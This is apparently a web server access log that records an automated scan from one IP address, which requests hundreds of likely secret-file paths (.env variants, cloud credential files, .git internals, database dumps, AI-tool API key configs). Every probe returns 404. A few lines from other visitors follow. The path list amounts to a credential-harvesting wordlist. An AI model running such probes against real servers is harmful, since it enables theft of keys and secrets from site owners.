+INFO:     104.155.92.41:33648 - "GET / HTTP/1.1" 200 OK
+INFO:     104.155.92.41:50256 - "GET /.env.old HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50216 - "GET /.env.backup HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50260 - "GET /.env.save HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50160 - "GET /.env.production HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50232 - "GET /backend/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50158 - "GET /.env.local HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50176 - "GET /.env.development HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50280 - "GET /src/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50192 - "GET /.env.bak HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50204 - "GET /api/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50276 - "GET /.env.test HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50152 - "GET /.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50300 - "GET /laravel/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50260 - "GET /.env~ HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50216 - "GET /.env.staging HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50160 - "GET /.env.dist HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50256 - "GET /app/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50332 - "GET /.env.prod HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50280 - "GET /.env.dev HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50204 - "GET /.env.live HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50192 - "GET /.env.testing HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50374 - "GET /.env.docker HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50362 - "GET /.env.sample HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50300 - "GET /.env.orig HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50216 - "GET /.env.txt HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50388 - "GET /.env.stage HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50260 - "GET /.env.development.local HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50390 - "GET /server/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50152 - "GET /.env.production.local HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50264 - "GET /frontend/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50232 - "GET /core/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50160 - "GET /cms/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50328 - "GET /.env.example HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50244 - "GET /public/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50256 - "GET /config/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50332 - "GET /api/v2/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50192 - "GET /admin-api/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50276 - "GET /api-backend/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50362 - "GET /.env.aws HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50204 - "GET /.claude/settings.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50300 - "GET /.cursor/mcp.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50216 - "GET /.claude/settings.local.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50378 - "GET /.env.copy HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50260 - "GET /.codeium/windsurf/mcp_config.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50388 - "GET /.continue/config.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50348 - "GET /.env.swp HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50314 - "GET /.llm/credentials HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50232 - "GET /.aws/config HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50264 - "GET /.aws/credentials HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50244 - "GET /.aws/credentials.bak HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50328 - "GET /.config/gcloud/application_default_credentials.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50276 - "GET /.azure/accessTokens.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50280 - "GET /.azure/azureProfile.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50152 - "GET /.config/gcloud/credentials.db HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50160 - "GET /.docker/config.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50192 - "GET /.dockercfg HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50390 - "GET /.config/llm/credentials HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50332 - "GET /.s3cfg HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50418 - "GET /.boto HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50204 - "GET /.git/HEAD HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50216 - "GET /.git/packed-refs HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50362 - "GET /.kube/config HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50300 - "GET /.git/index HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50416 - "GET /.git/config HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50378 - "GET /.git/logs/HEAD HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50374 - "GET /.anthropic/config.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50260 - "GET /.git/info/refs HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50402 - "GET /.git/refs/heads/master HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50296 - "GET /web/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50176 - "GET /admin/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50244 - "GET /.git/ORIG_HEAD HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50328 - "GET /.git/refs/heads/staging HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50314 - "GET /.git/logs/refs/heads/master HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50192 - "GET /.git/logs/refs/heads/main HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50332 - "GET /.git-credentials HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50280 - "GET /.github/workflows/deploy.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50264 - "GET /.github/workflows/ci.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50348 - "GET /.git/COMMIT_EDITMSG HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50388 - "GET /.git/FETCH_HEAD HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50232 - "GET /.gitmodules HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50260 - "GET /.svn/entries HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50216 - "GET /.DS_Store HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50204 - "GET /actuator/env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50374 - "GET /.hg/hgrc HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50418 - "GET /actuator/configprops HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50378 - "GET /.bzr/branch/branch.conf HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50152 - "GET /.github/workflows/main.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50300 - "GET /.svn/wc.db HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50362 - "GET /.hg/requires HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50416 - "GET /.gitlab-ci.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50402 - "GET /api/actuator/env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50158 - "GET /api/v1/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50192 - "GET /actuator/beans HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50244 - "GET /%40fs/root/.aws/credentials HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50328 - "GET /%40fs/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50176 - "GET /%40fs/home/ubuntu/.aws/credentials HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50332 - "GET /actuator/heapdump HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50314 - "GET /phpinfo HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50160 - "GET /symfony/_profiler/phpinfo HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50264 - "GET /admin/phpinfo.php HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50256 - "GET /.git/description HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50276 - "GET /.git/refs/heads/production HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50296 - "GET /phpinfo.php HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50390 - "GET /api/phpinfo.php HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50388 - "GET /info.php HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50348 - "GET /_profiler/phpinfo HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50280 - "GET /php_info.php HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50432 - "GET /.git/refs/heads/main HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50260 - "GET /config.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50216 - "GET /config.yaml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50378 - "GET /config.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50418 - "GET /appsettings.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50374 - "GET /config/config.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50204 - "GET /appsettings.Development.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50232 - "GET /credentials.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50300 - "GET /appsettings.Production.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50256 - "GET /settings.py HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50176 - "GET /config/parameters.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50362 - "GET /client_secrets.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50402 - "GET /secrets.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50192 - "GET /secrets.yaml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50314 - "GET /.pypirc HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50264 - "GET /parameters.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50390 - "GET /.streamlit/secrets.toml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50160 - "GET /.dbeaver/credentials-config.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50436 - "GET /.cargo/credentials.toml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50446 - "GET /web.config HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50348 - "GET /.npmrc HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50388 - "GET /.netrc HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50296 - "GET /wp-config.php.bak HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50152 - "GET /.gem/credentials HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50176 - "GET /wp-config.php.save HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50158 - "GET /secrets.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50276 - "GET /wp-config.php.swp HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50460 - "GET /wp-config.txt HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50416 - "GET /credentials.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50216 - "GET /config.php.bak HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50204 - "GET /terraform.tfvars HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50256 - "GET /terraform.tfstate HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50418 - "GET /serverless.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50260 - "GET /.terraform/terraform.tfstate HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50374 - "GET /serverless.yaml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50300 - "GET /terraform.tfstate.backup HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50378 - "GET /docker-compose.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50362 - "GET /configuration.php.old HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50192 - "GET /.circleci/config.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50432 - "GET /compose.yaml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50402 - "GET /vercel.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50332 - "GET /wp-config.php.old HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50390 - "GET /Jenkinsfile HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50176 - "GET /azure-pipelines.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50264 - "GET /backup.sql HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50296 - "GET /bitbucket-pipelines.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50314 - "GET /db.sql HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50436 - "GET /dump.sql HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50388 - "GET /.drone.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50348 - "GET /database.sql HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50244 - "GET /settings.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50460 - "GET /v2/_catalog HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50276 - "GET /api/v3/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50152 - "GET /.env.production.backup HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50328 - "GET /.travis.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50332 - "GET /project/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50216 - "GET /site/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50256 - "GET /.gemini/settings.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50418 - "GET /DataFiles/env.js HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50204 - "GET /.claude/.credentials.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50260 - "GET /env.txt HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50374 - "GET /__ENV.js HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50378 - "GET /env.js HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50446 - "GET /.codex/auth.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50232 - "GET /.htpasswd HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50300 - "GET /js/config.js HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50362 - "GET /auth.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50280 - "GET /netlify.toml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50432 - "GET /.pgpass HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50158 - "GET /api/v1/namespaces/default/secrets HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50276 - "GET /app/etc/env.php HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50264 - "GET /config/master.key HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50160 - "GET /app/etc/local.xml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50460 - "GET /sites/default/settings.php HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50390 - "GET /server-status HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50244 - "GET /telescope/requests HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50296 - "GET /.my.cnf HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50348 - "GET /elmah.axd HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50388 - "GET /metrics HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50300 - "GET /.aws/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50232 - "GET /.docker/laravel/app/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50280 - "GET /.env.anthropic HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50362 - "GET /.docker/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50216 - "GET /.env.openai HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50204 - "GET /app.config.js HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50314 - "GET /.htaccess HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50332 - "GET /.env.php HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50418 - "GET /Dockerfile HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50378 - "GET /app.js HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50402 - "GET /.env-example HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50158 - "GET /.env-sample HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50256 - "GET /aws-exports.js HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50328 - "GET /back/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50446 - "GET /backup/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50244 - "GET /composer.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50276 - "GET /config.js HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50436 - "GET /config/config.js HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50460 - "GET /config.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50192 - "GET /credentials HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50176 - "GET /config/aws.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50264 - "GET /env-config.js HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50474 - "GET /credentials.ini HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50152 - "GET /config.php HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50296 - "GET /dev/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50348 - "GET /index.js HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50260 - "GET /.amplifyrc HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50388 - "GET /media/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50332 - "GET /new/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50216 - "GET /production/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50256 - "GET /runtime-config.js HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50232 - "GET /sendgrid.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50418 - "GET /sentry.properties HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50362 - "GET /old/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50314 - "GET /settings.php HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:37818 - "GET /staging/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50446 - "GET /storage/logs/laravel.log HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50402 - "GET /server-info HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50280 - "GET /test/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50204 - "GET /v2/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50158 - "GET /v1/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50160 - "GET /env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50276 - "GET /vendor/composer/installed.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50328 - "GET /app/config/parameters.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50436 - "GET /wp-content/debug.log HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50176 - "GET /.huggingface/token HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50244 - "GET /.config/io.datasette.llm/keys.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50192 - "GET /.cache/huggingface/token HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50390 - "GET /.config/shell_gpt/.sgptrc HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50378 - "GET /.config/llm/keys.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50264 - "GET /.litellm/config.yaml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50374 - "GET /application/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50300 - "GET /.config/aichat/config.yaml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50296 - "GET /litellm/config.yaml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50388 - "GET /litellm.yaml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50204 - "GET /.openai/credentials.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:37818 - "GET /.config/openai/config.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50314 - "GET /.config/anthropic/config.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50402 - "GET /.config/gh/hosts.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50216 - "GET /.idea/workspace.xml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50232 - "GET /.idea/dataSources.xml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50280 - "GET /.idea/deployment.xml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50256 - "GET /.vscode/ftp-sync.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50418 - "GET /config/default.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50474 - "GET /.vscode/settings.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50362 - "GET /.vscode/sftp.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:37828 - "GET /config/production.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50460 - "GET /.config/huggingface/token HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50244 - "GET /service-account-key.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50436 - "GET /config/custom-environment-variables.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50378 - "GET /.config/configstore/firebase-tools.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50192 - "GET /service_account.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50374 - "GET /.config/configstore/ HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50328 - "GET /.config/doctl/config.yaml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50176 - "GET /.sentryclirc HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50300 - "GET /.pg_service.conf HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50152 - "GET /config/local.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50348 - "GET /OAI_CONFIG_LIST HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50388 - "GET /oai_config_list.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50332 - "GET /.env.local.php HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50416 - "GET /demo/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50418 - "GET /.config/fabric/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:37818 - "GET /.config/zed/settings.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50216 - "GET /.config/mods/mods.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50314 - "GET /claude_desktop_config.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50232 - "GET /aider.conf.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50474 - "GET /.windsurf/mcp_config.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50158 - "GET /.config/rclone/rclone.conf HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50432 - "GET /.gemini/.env HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50362 - "GET /.aider.model.settings.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:37828 - "GET /.m2/settings.xml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50244 - "GET /settings.xml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50176 - "GET /.gradle/gradle.properties HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50160 - "GET /.oci/config HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50204 - "GET /.config/claude/config.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50256 - "GET /.config/gemini/settings.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50418 - "GET /gradle.properties HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50328 - "GET /nuget.config HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:37818 - "GET /alertmanager.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50300 - "GET /prometheus.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50192 - "GET /grafana/provisioning/datasources/default.yml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50474 - "GET /.nuget/NuGet.Config HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50276 - "GET /redis.conf HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50436 - "GET /rabbitmq.conf HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50460 - "GET /definitions.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50280 - "GET /homeassistant/secrets.yaml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50388 - "GET /config/secrets.yaml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50348 - "GET /config/configuration.yaml HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50244 - "GET /passwd-s3fs HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50176 - "GET /.b2_account_info HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50362 - "GET /.mc/config.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50378 - "GET /.ansible/vault_pass.txt HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50216 - "GET /wg0.conf HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:37828 - "GET /.vault_pass.txt HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50332 - "GET /client.ovpn HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50314 - "GET /.buildkite/buildkite-agent.cfg HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50232 - "GET /secrets.pkrvars.hcl HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50158 - "GET /variables.pkrvars.hcl HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50374 - "GET /grafana.ini HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50402 - "GET /.config/Claude/claude_desktop_config.json HTTP/1.1" 404 Not Found
+INFO:     104.155.92.41:50160 - "GET /etc/dovecot/dovecot-sql.conf HTTP/1.1" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.172.179:45530 - "GET / HTTP/1.1" 200 OK
+INFO:     66.132.172.179:45554 - "PRI %2A HTTP/2.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.172.179:45588 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     66.132.172.179:34322 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     66.132.172.179:32370 - "GET /static/js/home.js HTTP/1.1" 200 OK
+INFO:     66.132.172.179:52574 - "GET /static/css/home.css HTTP/1.1" 200 OK
+WARNING:  Invalid HTTP request received.
+INFO:     66.132.172.179:63914 - "GET /phpinfo.php HTTP/1.1" 404 Not Found
+INFO:     43.134.236.36:42580 - "GET / HTTP/1.1" 200 OK
+INFO:     69.5.169.58:40825 - "GET / HTTP/1.1" 200 OK
+INFO:     69.5.169.221:11382 - "GET / HTTP/1.1" 200 OK
+INFO:     69.5.169.132:6808 - "GET /static/img/ciallo.png HTTP/1.1" 200 OK
+INFO:     69.5.169.204:2370 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     69.5.169.208:7020 - "GET /mcp HTTP/1.1" 404 Not Found
+INFO:     69.5.169.132:6814 - "GET /mcp/ HTTP/1.1" 404 Not Found
+INFO:     69.5.169.163:7842 - "GET / HTTP/1.1" 200 OK
